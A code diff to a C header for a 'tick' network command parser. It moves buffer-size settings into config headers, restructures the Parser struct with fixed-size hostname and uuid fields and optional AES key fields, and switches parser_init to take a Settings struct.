@@ -16,13 +16,8 @@
 #include <sys/types.h>
 #include <stdint.h>
 
-// Buffer size for the parser.
-// We keep a fixed buffer size to ensure memory consumption is more or less fixed.
-// This is especially important on embedded systems.
-// Do not let it exceed one memory page or it may cause stack overrun problems.
-#ifndef TICK_PARSER_BUFFER_SIZE
-#define TICK_PARSER_BUFFER_SIZE 1024
-#endif
+#include "common.h"
+#include "config.h"
 
 // Base command IDs per category.
 #define BASE_CMD_SYSTEM         0x0000
@@ -85,25 +80,26 @@ typedef struct              // (all values below in network byte order)
 // Parser class definition.
 typedef struct
 {
-    char *hostname;
+    char uuid[16];
+    char hostname[64];
     int port;
-    void *callback;     // it's really ConnectionCallback
-    void *userdata;
-    unsigned char uuid[16];
     int fd;
+#ifndef TICK_FEATURES_NO_CRYPTO
+    int use_aes;
+    uint8_t aes_key[TICK_AES_SIZE / 8];
+    uint8_t aes_iv[TICK_AES_SIZE / 8];
+#endif
     CMD_HEADER header;
     char *buffer[TICK_PARSER_BUFFER_SIZE];
 } Parser;
 
-// Callback function type.
-typedef int (*ConnectionCallback)(Parser *parser, void *userdata);
-
 // Helper functions.
+int is_empty(const unsigned char *buffer, size_t size);
 void uuid4(unsigned char *uuid);
 int copy_stream(int source, int destination, ssize_t count);
 
 // Parser methods.
-void parser_init(Parser *parser, const char *hostname, int port, ConnectionCallback callback, void *userdata);
+void parser_init(Parser *parser, const Settings *settings);
 void parser_close(Parser *parser);
 void parser_begin_response(Parser *parser, uint8_t status, uint16_t length);
 void parser_ok(Parser *parser);
